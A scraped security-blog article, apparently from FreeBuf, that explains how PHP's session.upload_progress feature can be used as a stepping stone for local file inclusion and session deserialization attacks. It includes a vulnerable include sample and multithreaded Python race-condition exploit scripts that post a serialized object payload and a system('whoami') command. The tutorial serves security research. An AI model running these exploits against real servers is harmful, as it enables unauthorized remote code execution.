style="color:#a50">#coding=utf-8</span></span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">import</span> <span class="cm-variable" style="color:#000">requests</span></span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">import</span> <span class="cm-variable" style="color:#000">threading</span></span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">import</span> <span class="cm-variable" style="color:#000">io</span></span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">import</span> <span class="cm-variable" style="color:#000">sys</span></span><br><span style="padding-right:.1px"><span>​</span></span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">def</span> <span class="cm-def" style="color:#00f">exp</span>(<span class="cm-variable" style="color:#000">ip</span>,<span class="cm-variable" style="color:#000">port</span>):</span><br><span class="cm-tab-wrap-hack" style="padding-right:.1px"><span class="cm-tab">    </span></span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">f</span> = <span class="cm-variable" style="color:#000">io</span>.<span class="cm-property" style="color:#000">BytesIO</span>(<span class="cm-string" style="color:#a11">b'a'</span> <span class="cm-operator" style="color:#981a1a">*</span> <span class="cm-number" style="color:#164">1024</span> <span class="cm-operator" style="color:#981a1a">*</span><span class="cm-number" style="color:#164">1024</span><span class="cm-operator" style="color:#981a1a">*</span><span class="cm-number" style="color:#164">1</span>)</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">while</span> <span class="cm-keyword" style="color:#708">True</span>:</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">et</span>.<span class="cm-property" style="color:#000">wait</span>()</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">url</span> = <span class="cm-string" style="color:#a11">'http://'</span><span class="cm-operator" style="color:#981a1a">+</span><span class="cm-variable" style="color:#000">ip</span><span class="cm-operator" style="color:#981a1a">+</span><span class="cm-string" style="color:#a11">':'</span><span class="cm-operator" style="color:#981a1a">+</span><span class="cm-builtin" style="color:#30a">str</span>(<span class="cm-variable" style="color:#000">port</span>)<span class="cm-operator" style="color:#981a1a">+</span><span class="cm-string" style="color:#a11">'/test5.php'</span></span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">headers</span> = {</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:#a11">'User-Agent'</span>: <span class="cm-string" style="color:#a11">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'</span>,</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:#a11">'Accept'</span>: <span class="cm-string" style="color:#a11">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:#a11">'Accept-Language'</span>: <span class="cm-string" style="color:#a11">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:#a11">'DNT'</span>: <span class="cm-string" style="color:#a11">'1'</span>,</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:#a11">'Cookie'</span>: <span class="cm-string" style="color:#a11">'PHPSESSID=20190506'</span>,</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:#a11">'Connection'</span>: <span class="cm-string" style="color:#a11">'close'</span>,</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:#a11">'Upgrade-Insecure-Requests'</span>: <span class="cm-string" style="color:#a11">'1'</span></span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span>}</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">proxy</span> = {</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:#a11">'http'</span>: <span class="cm-string" style="color:#a11">'127.0.0.1:8080'</span></span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span>}</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">data</span>={<span class="cm-string" style="color:#a11">'PHP_SESSION_UPLOAD_PROGRESS'</span>:<span class="cm-string" style="color:#a11">'123'</span>}</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">files</span>={</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-string" style="color:#a11">'file'</span>:(<span class="cm-string" style="color:#a11">r'|O:4:\"Door\":1:{s:6:\"handle\";O:2:\"IP\":1:{s:2:\"ip\";s:10:\"phpinfo();\";}}'</span>,<span class="cm-variable" style="color:#000">f</span>,<span class="cm-string" style="color:#a11">'text/plain'</span>)</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span>}</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">resp</span> = <span class="cm-variable" style="color:#000">requests</span>.<span class="cm-property" style="color:#000">post</span>(<span class="cm-variable" style="color:#000">url</span>,<span class="cm-variable" style="color:#000">headers</span>=<span class="cm-variable" style="color:#000">headers</span>,<span class="cm-variable" style="color:#000">data</span>=<span class="cm-variable" style="color:#000">data</span>,<span class="cm-variable" style="color:#000">files</span>=<span class="cm-variable" style="color:#000">files</span>,<span class="cm-variable" style="color:#000">proxies</span>=<span class="cm-variable" style="color:#000">proxy</span>) <span class="cm-comment" style="color:#a50">#,proxies=proxy</span></span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">resp</span>.<span class="cm-property" style="color:#000">encoding</span>=<span class="cm-string" style="color:#a11">"utf-8"</span></span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">if</span> <span class="cm-builtin" style="color:#30a">len</span>(<span class="cm-variable" style="color:#000">resp</span>.<span class="cm-property" style="color:#000">text</span>)<span class="cm-operator" style="color:#981a1a">&lt;</span><span class="cm-number" style="color:#164">2000</span>:</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-builtin" style="color:#30a">print</span>(<span class="cm-string" style="color:#a11">'[+++++]retry'</span>)</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">else</span>:</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-builtin" style="color:#30a">print</span>(<span class="cm-variable" style="color:#000">resp</span>.<span class="cm-property" style="color:#000">content</span>.<span class="cm-property" style="color:#000">decode</span>(<span class="cm-string" style="color:#a11">'utf-8'</span>).<span class="cm-property" style="color:#000">encode</span>(<span class="cm-string" style="color:#a11">'utf-8'</span>))</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">et</span>.<span class="cm-property" style="color:#000">clear</span>()</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-builtin" style="color:#30a">print</span>(<span class="cm-string" style="color:#a11">'success!'</span>)</span><br><span class="cm-tab-wrap-hack" style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span></span><br><span style="padding-right:.1px"><span>​</span></span><br><span style="padding-right:.1px"><span class="cm-keyword" style="color:#708">if</span> <span class="cm-variable" style="color:#000">__name__</span> == <span class="cm-string" style="color:#a11">"__main__"</span>:</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">ip</span>=<span class="cm-variable" style="color:#000">sys</span>.<span class="cm-property" style="color:#000">argv</span>[<span class="cm-number" style="color:#164">1</span>]</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">port</span>=<span class="cm-builtin" style="color:#30a">int</span>(<span class="cm-variable" style="color:#000">sys</span>.<span class="cm-property" style="color:#000">argv</span>[<span class="cm-number" style="color:#164">2</span>])</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">et</span>=<span class="cm-variable" style="color:#000">threading</span>.<span class="cm-property" style="color:#000">Event</span>()</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-keyword" style="color:#708">for</span> <span class="cm-variable" style="color:#000">i</span> <span class="cm-keyword" style="color:#708">in</span> <span class="cm-variable" style="color:#000">xrange</span>(<span class="cm-number" style="color:#164">1</span>,<span class="cm-number" style="color:#164">40</span>):</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">threading</span>.<span class="cm-property" style="color:#000">Thread</span>(<span class="cm-variable" style="color:#000">target</span>=<span class="cm-variable" style="color:#000">exp</span>,<span class="cm-variable" style="color:#000">args</span>=(<span class="cm-variable" style="color:#000">ip</span>,<span class="cm-variable" style="color:#000">port</span>)).<span class="cm-property" style="color:#000">start</span>()</span><br><span style="padding-right:.1px"><span class="cm-tab">    </span><span class="cm-variable" style="color:#000">et</span>.<span class="cm-property" style="color:#000">set</span>()</span><br><span style="padding-right:.1px"><span>​</span></span></code></pre><p>首先在代码里加个代理，利用burp抓包。如下图</p><p><img alt="利用session.upload_progress进行文件包含和反序列化渗透" src="https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small" height="283" width="690"></p><p>这里有几个注意点：</p><blockquote>    <p>PHPSESSID必须要有，因为要竞争同一个文件</p>    <p>filename可控，但是在值的最前面加上<code>|</code>,因为最终目的是利用session的反序列化，<code>PHP_SESSION_UPLOAD_PROGRESS</code>只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突</p>    <p>上传的文件要大些，否则很难竞争成功。我写入是这么大<code>f = io.BytesIO(b'a' * 1024 *1024*1)</code></p>    <p>filename值中出现汉字时，会出错，所以在利用脚本前，<a href="https://blog.csdn.net/iriszx999/article/details/82113521">一定要修改python源码</a></p></blockquote><p>最后把<code>exp.py</code>中的代理去掉，直接跑<code>exp.py</code>,效果如下。</p><p><img alt="利用session.upload_progress进行文件包含和反序列化渗透" src="https://image.3001.net/images/20190506/1557146899_5cd02d139da64.png!small" height="267" width="690"></p><h3>几次失败尝试</h3><blockquote>    <p>其实，利用burp抓到<code>exp.py</code><span style="color:#333">流量后，可以直接在burp爆破，但貌似数据包数据有点多，导致burp反应很慢，最终失败。</span></p>    <p>另外，我尝试伪造<code>PHP_SESSION_UPLOAD_PROGRESS</code><span style="color:#333">的值，但是值中一旦出现</span><code>|</code><span style="color:#333">，将会导致数据写入session文件失败。</span></p></blockquote><h3>小结</h3><p>利用条件主要是存在session反序列化漏洞。</p><p>从文件包含和反序列化两个利用点，可以发现，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>可以绕过大部分过滤，而且传输的数据也不易发现。</p><h2>最后</h2><p>我还是一枚小萌新，文章中有不对的地方，还请各位大佬们指正，非常感谢，嘻嘻嘻。</p><p><span style="color:#9fa3a8"><b>*本文作者：17851220695，转载请注明来自FreeBuf.COM</b></span></p></div></div> <!----> <div class="other-panel" data-v-81187e68><!----> <!----></div> <!----> <!----></div> <div class="tags-panel" data-v-81187e68><p data-v-81187e68><span data-v-81187e68>本文作者：，</span> <span data-v-81187e68>
									转载请注明来自<a href="https://www.freebuf.com" class="net" data-v-81187e68>FreeBuf.COM</a></span></p> <div data-v-81187e68><span class="tag" data-v-81187e68><span class="spot" data-v-81187e68><i class="pot" data-v-81187e68></i></span> <span class="txt" data-v-81187e68># session.upload_progress</span></span><span class="tag" data-v-81187e68><span class="spot" data-v-81187e68><i class="pot" data-v-81187e68></i></span> <span class="txt" data-v-81187e68># 反序列化渗透</span></span></div></div></div></div> <div class="remix-module" data-v-81187e68><div class="module-title" data-v-81187e68><div class="title" data-v-81187e68>
							被以下专辑收录，发现更多精彩内容
							<!----></div></div> <div class="content column-module" data-v-81187e68><div class="add column-tag" style="background:#f1fff9" data-v-81187e68>
							+ 收入我的专辑
						</div> <div class="add column-tag" style="background:#f1fff9" data-v-81187e68>
							+ 加入我的收藏
						</div>  <div class="add column-tag" style="display:none" data-v-81187e68><span data-v-81187e68>展开更多</span> <span class="arrow" data-v-81187e68><i aria-label="图标: down" class="anticon anticon-down" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></div></div></div> <div class="comment" data-v-81187e68><div class="module-title" data-v-81187e68><div class="title" data-v-81187e68>
							评论<!----> <span class="sort" data-v-81187e68><i aria-label="图标: swap" class="anticon anticon-swap" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="swap" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M847.9 592H152c-4.4 0-8 3.6-8 8v60c0 4.4 3.6 8 8 8h605.2L612.9 851c-4.1 5.2-.4 13 6.3 13h72.5c4.9 0 9.5-2.2 12.6-6.1l168.8-214.1c16.5-21 1.6-51.8-25.2-51.8zM872 356H266.8l144.3-183c4.1-5.2.4-13-6.3-13h-72.5c-4.9 0-9.5 2.2-12.6 6.1L150.9 380.2c-16.5 21-1.6 51.8 25.1 51.8h696c4.4 0 8-3.6 8-8v-60c0-4.4-3.6-8-8-8z"></path></svg></i>按热度排序
							</span></div></div> <div class="intro-list" data-v-81187e68></div> <!----> <div class="bottom-comment-region" data-v-81187e68><div class="input-item" data-v-96500214 data-v-81187e68><div class="avatar" data-v-96500214><div class="img" data-v-96500214><img src="https://image.3001.net/images/index/wp-user-avatar-50x50.png" data-v-96500214></div></div> <div class="content nologin" data-v-96500214><p data-v-96500214>请<span data-v-96500214>登录</span>/<span data-v-96500214>注册</span>后在FreeBuf发布内容哦</p></div></div></div></div> <div class="introduce" data-v-81187e68><div class="module-title" data-v-81187e68><div class="title" data-v-81187e68>
							相关推荐
						</div></div> <div class="intro-list" data-v-81187e68></div></div></div> <div class="aside-right" data-v-81187e68><div class="module-top" data-v-81187e68><div class="author-panel" data-v-81187e68><div class="top-panel" data-v-81187e68><div class="avatar" data-v-81187e68><span data-v-81187e68><img src="" data-v-81187e68>\
								</span></div> <div class="info" data-v-81187e68><div class="name-info" data-v-81187e68><span class="name" data-v-81187e68></span> <!----> <!----> <!----></div> <div class="desc text-line-3" data-v-81187e68>
									
								</div> <p class="follow-view" data-v-81187e68><button type="button" class="focus ant-btn ant-btn-colorBorder" style="margin-top:20px;width:132px" data-v-81187e68><span>关 注</span></button></p></div></div> <ul class="number-panel" data-v-81187e68><li class="item" data-v-81187e68><span class="num" data-v-81187e68>0</span> <span data-v-81187e68>文章数</span></li> <li class="item" data-v-81187e68><span class="num" data-v-81187e68>0</span> <span data-v-81187e68>评论数</span></li> <li class="item" data-v-81187e68><span class="num" data-v-81187e68>0</span> <span data-v-81187e68>关注者</span></li></ul></div> <!----> <!----></div> <div class="module-middle" data-v-81187e68></div> <!----></div></div> <div class="foot" data-v-81187e68><div class="foot-wraper" data-v-81187e68><div class="foot-container" data-v-81187e68><div class="foot-left" data-v-81187e68><div class="focusInput" data-v-81187e68>
								请 <a href="https://www.freebuf.com/oauth" data-v-81187e68>登录</a> /
								<a href="https://account.tophant.com/register.html" data-v-81187e68>注册</a>后在FreeBuf发布内容哦
							</div></div> <div class="foot-right" data-v-81187e68><span class="approve-num" data-v-81187e68><svg aria-hidden="true" class="svg-icon" style="font-size:20px;margin-right:3px" data-v-322983b7 data-v-81187e68><use xlink:href="#like-fill" data-v-322983b7></use></svg>
						</span> <span class="comment-num" style="margin-left:30px" data-v-81187e68><svg aria-hidden="true" class="svg-icon" style="font-size:20px;margin-right:3px" data-v-322983b7 data-v-81187e68><use xlink:href="#message-fill" data-v-322983b7></use></svg>
						</span></div></div> <div class="foot-container" style="display:none" data-v-81187e68><div class="foot-left" data-v-81187e68><textarea placeholder="请输入您的评论..." maxlength="500" class="ant-input" data-v-81187e68></textarea></div> <div class="foot-right" data-v-81187e68><label class="ant-checkbox-wrapper" data-v-81187e68><span class="ant-checkbox"><input type="checkbox" class="ant-checkbox-input"><span class="ant-checkbox-inner"></span></span><span>
							匿名
						</span></label> <button type="button" class="join ant-btn" data-v-81187e68><span>发 表</span></button> <button type="button" class="cancel ant-btn" data-v-81187e68><span>取 消</span></button> <label class="ant-checkbox-wrapper ant-checkbox-wrapper-checked" style="display:none" data-v-81187e68><span class="ant-checkbox ant-checkbox-checked"><input type="checkbox" checked class="ant-checkbox-input"><span class="ant-checkbox-inner"></span></span><span>
							有人回复时邮件通知我
						</span></label></div></div></div></div> <!----> <!----> <!----> <div data-v-2a4dba56 data-v-81187e68><!----></div> <!----> <!----> <!----> <!----></div></main> <footer class="ant-layout-footer" data-v-55d8de90><div class="footer" data-v-1d178813 data-v-55d8de90><div class="container" data-v-1d178813><div class="footer-left" data-v-1d178813><img src="https://www.freebuf.com/images/logo_b.png" data-v-1d178813> <p data-v-1d178813><span data-v-1d178813>本站由</span>阿里云 提供计算与安全服务</p></div> <div class="footer-center clearfix" data-v-1d178813><div class="footer-list" data-v-1d178813><h3 data-v-1d178813>用户服务</h3> <ul data-v-1d178813><li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/write" data-v-1d178813>有奖投稿</a></li> <li data-v-1d178813><a target="_blank" href="https://www.vulbox.com/bounties/detail-72" data-v-1d178813>提交漏洞</a></li> <li data-v-1d178813><a target="_blank" href="https://www.vulbox.com/projects/list" data-v-1d178813>参与众测</a></li> <li data-v-1d178813><a target="_blank" href="https://shop.freebuf.com" data-v-1d178813>商城</a></li></ul></div> <div class="footer-list" data-v-1d178813><h3 data-v-1d178813>企业服务</h3> <ul data-v-1d178813><li data-v-1d178813><a target="_blank" href="https://company.freebuf.com" data-v-1d178813>安全咨询</a></li> <li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/news/307349.html" data-v-1d178813>产业全景图</a></li> <li data-v-1d178813><a target="_blank" href="https://www.vulbox.com/service/src" data-v-1d178813>企业SRC</a></li> <li data-v-1d178813><a target="_blank" href="https://www.vulbox.com/" data-v-1d178813>安全众测</a></li></ul></div> <div class="footer-list" data-v-1d178813><h3 data-v-1d178813>合作信息</h3> <ul data-v-1d178813><li data-v-1d178813><a target="_blank" href="https://www.tophant.com/" data-v-1d178813>斗象官网</a></li> <li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/advertise" data-v-1d178813>广告投放</a></li> <li data-v-1d178813><a target="_blank" href="mailto:help@freebuf.com" data-v-1d178813>联系我们</a></li> <li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/friends" data-v-1d178813>友情链接</a></li></ul></div> <div class="footer-list" data-v-1d178813><h3 data-v-1d178813>关于我们</h3> <ul data-v-1d178813><li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/news/others/864.html" data-v-1d178813>关于我们</a></li> <li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/jobs/40386.html" data-v-1d178813>加入我们</a></li> <li data-v-1d178813><div class="weixin-pannel weixin" data-v-1d178813 data-v-1d178813><a href="javascript:;" class="g-icon-qr1" data-v-1d178813>微信公众号</a></div></li> <li data-v-1d178813><a target="_blank" href="http://weibo.com/freebuf" data-v-1d178813>新浪微博</a></li></ul></div> <div class="footer-list" data-v-1d178813><h3 data-v-1d178813>战略伙伴</h3> <ul data-v-1d178813><li style="padding:0 0 10px" data-v-1d178813><a rel="nofollow" target="_blank" href="http://www.aliyun.com/?freebuf" data-v-1d178813><img src="https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png" data-v-1d178813></a></li> <li style="padding:0 0 10px" data-v-1d178813><a rel="nofollow" target="_blank" href="http://www.upyun.com/?freebuf" data-v-1d178813><img src="https://image.3001.net/images/20191017/1571310907_5da84d3bbdf2c.png" data-v-1d178813></a></li> <li style="padding:0 0 10px" data-v-1d178813><a rel="nofollow" target="_blank" href="https://www.trustasia.com/?freebuf" data-v-1d178813><img src="https://image.3001.net/images/20191017/1571306606_5da83c6e8de1c.png" data-v-1d178813></a></li></ul></div></div> <div class="footer-right" data-v-1d178813><h3 data-v-1d178813>FreeBuf+小程序</h3> <img src="https://www.freebuf.com/images/xcx-code.png" alt data-v-1d178813> <p data-v-1d178813>扫码把安全装进口袋</p></div></div> <div class="copyright" data-v-1d178813><div class="container" data-v-1d178813><ul class="clearfix" data-v-1d178813><li data-v-1d178813><a href="https://www.tophant.com/" target="_blank" data-v-1d178813>斗象科技</a></li> <li data-v-1d178813><a href="https://www.freebuf.com" target="_blank" data-v-1d178813>FreeBuf</a></li> <li data-v-1d178813><a href="https://www.vulbox.com/" target="_blank" data-v-1d178813>漏洞盒子</a></li> <li data-v-1d178813><a href="https://www.tophant.ai/" target="_blank" data-v-1d178813>斗象智能安全平台</a></li> <li data-v-1d178813><a href="https://www.freebuf.com/dis" target="_blank" data-v-1d178813>免责条款</a></li> <li data-v-1d178813><a href="https://my.freebuf.com/AgreeProtocol/duty" target="_blank" data-v-1d178813>协议条款</a></li></ul> <p data-v-1d178813>
        Copyright © 2020 WWW.FREEBUF.COM All Rights Reserved
        <a rel="nofollow" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" data-v-1d178813>
             沪ICP备13033796号
        </a> <span style="padding:0 8px" data-v-1d178813>|</span> <a rel="nofollow" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321" data-v-1d178813>
          沪公安网备
          <img src="https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png" style="display:inline-block;width:14px;height:12px;position:relative;top:1px;left:3px" data-v-1d178813></a></p></div></div></div></footer></section></div></div></div><script>window.__NUXT__=function(s,a){return{layout:"articles",data:[{articalId:"202819",jobPosition:s,serverData:{post_title:"利用session.upload_progress进行文件包含和反序列化渗透",post_author:a,nickname:a,post_date:"2019-05-17 10:00:30",post_picture:"https://image.3001.net/images/20190508/15572945855858.png!small",category:[{name:"漏洞",slug:"vuls",url:"https://www.freebuf.com/vuls"},{name:"其他",slug:"others-articles",url:"https://www.freebuf.com/articles/others-articles"}],tag:[{tag_id:"13518",name:"session.upload_progress",url:"https://www.freebuf.com/tag/session-upload_progress"},{tag_id:"13519",name:"反序列化渗透",url:"https://www.freebuf.com/tag/%25e5%258f%258d%25e5%25ba%258f%25e5%2588%2597%25e5%258c%2596%25e6%25b8%2597%25e9%2580%258f"}],post_desc:"本文主要是利用PHP中的session.upload_progress功能作为跳板，从而进行文件包含和反序列化漏洞利用。",paid_read:s,vip_read:s,paid_read_amount:0,post_content:'<p><b style="color: rgb(239, 71, 71);">*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</b></p><h2>前言</h2><p><b style="color: rgb(0, 176, 80);">本文主要是利用PHP中的<code>session.upload_progress</code>功能作为跳板，从而进行文件包含和反序列化漏洞利用。由于首先需要了解关于session及其反序列化等相关的知识，所以对它们先进行介绍。有不对的地方，欢迎各位大佬指正。</b></p><h2>php中的session.upload_progress</h2><p>这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。</p><p>在php.ini有以下几个默认选项</p><pre><code><span style="padding-right:.1px;">1. session.upload_progress.enabled = on</span><br><span style="padding-right:.1px;">2. session.upload_progress.cleanup = on</span><br><span style="padding-right:.1px;">3. session.upload_progress.prefix = "upload_progress_"</span><br><span style="padding-right:.1px;">4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"</span><br><span style="padding-right:.1px;">5. session.upload_progress.freq = "1%"</span><br><span style="padding-right:.1px;">6. session.upload_progress.min_freq = "1"</span></code></pre><p>其实这里，我们只需要了解前四个配置选项即可，嘿嘿嘿，下面依次讲解。</p><blockquote>    <p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>    <p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>    <p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>    <p><code>prefix+name</code>将表示为session中的键名</p></blockquote><h2>session相关配置及session反序列化</h2><p>因为这个不是本文的重点，所以这里附上几个相关链接。</p><blockquote>    <p><a href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html">https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html</a></p>    <p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral">https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral</a></p></blockquote><p>另外，再添加个session配置中一个重要选项。</p><p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。</p><h2>利用session.upload_progress进行文件包含利用</h2><h3>测试环境</h3><blockquote>    <p>php5.5.38</p>    <p>win10</p>    <p>关于session相关的一切配置都是默认值</p></blockquote><h3>示例代码</h3><pre><code><span style="padding-right:.1px;"><span class="cm-operator" style="color:rgb(152,26,26);">&lt;?</span><span class="cm-variable" style="color:rgb(0,0,0);">php</span></span><br><span style="padding-right:.1px;"><span class="cm-variable-2" style="color:rgb(0,85,170);">$b</span><span class="cm-operator" style="color:rgb(152,26,26);">=</span><span class="cm-variable-2" style="color:rgb(0,85,170);">$_GET</span>[<span class="cm-string" style="color:rgb(170,17,17);">\'file\'</span>];</span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">include</span> <span class="cm-string" style="color:rgb(170,17,17);">"</span><span class="cm-variable-2" style="color:rgb(0,85,170);">$b</span><span class="cm-string" style="color:rgb(170,17,17);">"</span>;</span><br><span style="padding-right:.1px;"><span class="cm-operator" style="color:rgb(152,26,26);">?&gt;</span></span></code></pre><p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p><h3>分析</h3><p><b>问题一</b></p><p>代码里没有<code>session_start()</code>,如何创建session文件呢。</p><p><b>解答一</b></p><p>其实，如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p><p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。    </p><p><b>问题二</b></p><p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p><p><b>如何进行rce呢？</b></p><p><b>解答二</b></p><p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p><h3>利用脚本</h3><pre><code><span style="padding-right:.1px;"><span class="cm-comment" style="color:rgb(170,85,0);">#coding=utf-8</span></span><br><span style="padding-right:.1px;"><span>​</span></span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">import</span> <span class="cm-variable" style="color:rgb(0,0,0);">io</span></span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">import</span> <span class="cm-variable" style="color:rgb(0,0,0);">requests</span></span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">import</span> <span class="cm-variable" style="color:rgb(0,0,0);">threading</span></span><br><span style="padding-right:.1px;"><span class="cm-variable" style="color:rgb(0,0,0);">sessid</span> = <span class="cm-string" style="color:rgb(170,17,17);">\'TGAO\'</span></span><br><span style="padding-right:.1px;"><span class="cm-variable" style="color:rgb(0,0,0);">data</span> = {<span class="cm-string" style="color:rgb(170,17,17);">"cmd"</span>:<span class="cm-string" style="color:rgb(170,17,17);">"system(\'whoami\');"</span>}</span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">def</span> <span class="cm-def" style="color:rgb(0,0,255);">write</span>(<span class="cm-variable" style="color:rgb(0,0,0);">session</span>):</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">while</span> <span class="cm-keyword" style="color:rgb(119,0,136);">True</span>:</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">f</span> = <span class="cm-variable" style="color:rgb(0,0,0);">io</span>.<span class="cm-property" style="color:rgb(0,0,0);">BytesIO</span>(<span class="cm-string" style="color:rgb(170,17,17);">b\'a\'</span> 